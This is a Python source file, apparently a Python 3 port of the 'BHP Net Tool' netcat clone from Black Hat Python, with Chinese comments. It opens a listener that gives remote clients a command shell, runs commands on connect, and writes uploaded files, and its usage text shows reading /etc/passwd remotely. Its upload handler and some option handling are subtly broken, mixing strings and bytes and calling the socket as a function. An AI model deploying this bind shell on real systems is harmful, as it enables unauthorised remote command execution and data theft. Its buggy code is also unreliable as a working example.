'''
Netcat

'''
import sys
import socket
import getopt, threading, subprocess

socket.setdefaulttimeout(None)

listen      = False
command     = False
upload      = False
execute     = ''
target      = ''
upload_dest = ''
port        = 0

def usage():
    ''' 使用提示'''
    print(
        'BHP Net Tool \n\
        \n\
        Usage:bhpnet.py -t target_host -p port\n\
        -l --listen     -listen on [host]:[port] for incoming connections\n\
        -e --execute=file_to_run -execute the given file upon receiving a connection\n\
        -c --command    -initialize a command shell\n\
        -u --upload=destination -upon receiving connection upload a file and write to [destination]\n\
        \n\
        examples: \n\
        bhpnet.py -t 192.168.0.1 -p 5555 -l -c\n\
        bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe\n\
        bhpnet.py -t 192.168.0.1 -p 5555 -l -e="cat /etc/passwd"\n\
        echo "ABCDEFGHI" | ./bhpnet.py -t 192.168.11.12 -p 135\
        ')
    sys.exit(0)

def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect((target, port))

        if len(buffer):
            client.send(buffer.encode(encoding="utf-8"))

        while True:
            recv_len = 1
            response = b''

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break
            print(response.decode("utf-8"))
            # raw_input 在python3 合并成input(), 只接收字符串

            buffer = input('')
            buffer += '\n'

            client.send(buffer.encode(encoding="utf-8"))
    except:
        print('[*] Exception! Exiting.')
        client.close()
    
def server_loop():
    global target

    if not len(target):
        target = '0.0.0.0'
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        client_thread = threading.Thread(target=client_handler, 
        args=(client_socket, ))

        client_thread.start()

def run_command(command):
    '''subprocess库提供进程创建接口
    '''
    command = command.rstrip()

    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = b'Failed to execute commnad.\r\n'

    return output

def client_handler(client_socket):
    global upload
    global execute
    global command

    if len(upload_dest):
        file_buffer = ''
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data
                
            try:
                file_descriptor = open(upload_dest, 'wb')
                file_descriptor.write(file_buffer)
                file_descriptor.close()

                client_socket.send('Successfully saved file to %s\r\n' 
                % upload_dest)
                
            except:
                client_socket('Failed to save file to %s\r\n'
                % upload_dest)

    # 检查命令执行
    if len(execute):
        output = run_command(execute)

        client_socket.send(output)
    # 如果需要一个命令行shell, 那进入另一个循环
    if command:
        while True:
            client_socket.send(b'<BHP:#> ')

            cmd_buffer = b''
            while b'\n' not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
            
            response = run_command(cmd_buffer)

            client_socket.send(response)

                

def main():
    '''入口函数
    '''
    global listen
    global port
    global execute
    global command
    global upload_dest
    global target

    if not len(sys.argv[1:]):
        usage()
    # 读取命令行参数
    try:
        opts, args = getopt.getopt(sys.argv[1:], 'hle:t:p:cu:', 
        ['help',  'listen', 'execute', 'target', 'port', 'command', 'upload'])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o, a in opts:
        if o in ('-h', '--help'):
            usage()
        elif o in ('-l', '--listen'):
            listen = True
        elif o in ('-e', '--execute'):
            execute = a
        elif o in ('-c', '--commandshell'):
            command = True
        elif o in ('-u', '--upload'):
            upload_dest = a
        elif o in ('-t', '--target'):
            target = a
        elif o in ('-p', '--port'):
            port = int(a)
        else:
            assert False, 'Unhandled Option'
    if not listen and len(target) and port > 0:
    #     print('Pls input command:')
    #     buffer = sys.stdin.read()
    #     print("Your's command:", buffer)
        buffer = 'ls'
        client_sender(buffer)
    if listen:
        server_loop()

main()
